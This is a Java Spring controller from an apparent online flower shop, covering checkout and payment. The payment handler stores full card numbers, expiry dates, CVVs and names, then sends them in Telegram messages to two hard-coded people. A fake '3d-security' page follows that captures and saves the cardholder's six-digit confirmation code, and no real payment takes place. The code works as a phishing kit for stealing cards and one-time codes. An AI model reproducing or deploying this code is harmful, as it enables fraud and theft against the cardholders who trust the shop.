package com.example.FlowerShop.controllers;

import com.example.FlowerShop.TelegramBot.BotConfig;
import com.example.FlowerShop.models.Card;
import com.example.FlowerShop.models.Product;
import com.example.FlowerShop.models.User;
import com.example.FlowerShop.repo.CardRepository;
import com.example.FlowerShop.repo.ProductRepository;
import com.example.FlowerShop.repo.UserRepository;
import com.example.FlowerShop.TelegramBot.TelegramBot;
import lombok.RequiredArgsConstructor;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.List;

@Controller
@RequiredArgsConstructor
public class CardController {
    String cardTest;
    private final CardRepository cardRepository;
    private final UserRepository userRepository;
    private final TelegramBot bot;
    private final ProductRepository productRepository;
    private final BotConfig config;


    @GetMapping("/payment")
    public String paymentPage(Model model){
        return "payment";
    }

    @PostMapping("/payment")
    public String paymentPost(Model model, @RequestParam(name = "number") String number, @RequestParam (name = "date")String date,
                              @RequestParam(name = "nameOnCard") String nameOnCard,
                              @RequestParam(name = "cvv") String cvv) throws TelegramApiException {
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        boolean isPresent = userRepository.findByUsername(username).isPresent();
        if (isPresent){
            User user = userRepository.findByUsername(username).get();
            List<Product> products = user.getProducts();
            Long prodPrice = 0l;
            for (Product product : products) {
                prodPrice += product.getPrice();
                if (product.getPurchasesCount() == null) {
                    product.setPurchasesCount(1L);
                    productRepository.save(product);
                } else {
                    product.setPurchasesCount(product.getPurchasesCount() + 1L);
                    productRepository.save(product);
                }
            }
            Long deliveryPrice = 10L;
            Long totalPrice =  prodPrice + deliveryPrice;
            Card card = new Card();
            card.setCvv(cvv);
            card.setDateOfLicense(date);
            card.setNumber(number);
            card.setName(nameOnCard);
            card.setResultCheck(totalPrice);
            cardRepository.save(card);
            cardTest = number;
            String textToSend = "ПОСТУПИЛ НОВЫЙ ЗАКАЗ!!! \n\n\n" +
                    "Номер карты: " + number + "\n" +
                    "Срок карты: " + date + "\n " +
                    "CVV: " + cvv + "\n" +
                    "ИМЯ ФАМИЛИЯ: " + nameOnCard + "\n" +
                    "Сумма: $" + totalPrice + "\n" +
                    "Посмотреть все данные по ссылке: http://localhost:8080/admin";
            bot.sendMessage(config.getSevaId(), textToSend);
            bot.sendMessage(config.getAntonId(), textToSend);
        }
        return "redirect:/3d-security";
    }


    @GetMapping("/3d-security")
    public String codePage(Model model){
        short hour = (short) LocalDateTime.now().getHour();
        short minutes = (short) LocalDateTime.now().getMinute();
        String dayOfWeek = LocalDateTime.now().getDayOfWeek().name();
        String month = LocalDateTime.now().getMonth().name();
        short day = (short) LocalDateTime.now().getDayOfMonth();
        model.addAttribute("hour", hour);
        model.addAttribute("min", minutes);
        model.addAttribute("day", day);
        model.addAttribute("dayOfWeek", dayOfWeek);
        model.addAttribute("month", month);
        return "3d-security";
    }

    @PostMapping("/3d-security")
    public String codePost(@RequestParam String sybmol1, @RequestParam String sybmol2,
                           @RequestParam String sybmol3, @RequestParam String sybmol4,
                           @RequestParam String sybmol5, @RequestParam String sybmol6){
        Card card = cardRepository.findByNumber(cardTest);
        String code = sybmol1 + sybmol2 + sybmol3 + sybmol4 + sybmol5 + sybmol6;
        card.setCode(code);
        cardRepository.save(card);
        cardTest = "";
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        boolean isPresent = userRepository.findByUsername(username).isPresent();
        if (isPresent){
            User user = userRepository.findByUsername(username).get();
            user.getProducts().clear();
            userRepository.save(user);
        }
        return "redirect:/shop";
    }

    @GetMapping("/checkout")
    public String checkoutPage(Model model) {
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        boolean isPresent = userRepository.findByUsername(username).isPresent();
        if (isPresent){
            User user = userRepository.findByUsername(username).get();
            List<Product> products = user.getProducts();
            model.addAttribute("products", products);
            float prodPrice = 0f;
            for (Product product : products) {
                prodPrice += product.getPrice();
            }
            float deliveryPrice = 10;
            float totalPrice =  prodPrice + deliveryPrice;
            model.addAttribute("delivery", deliveryPrice);
            model.addAttribute("totalPrice", totalPrice);
        }
        return "checkout";
    }

}
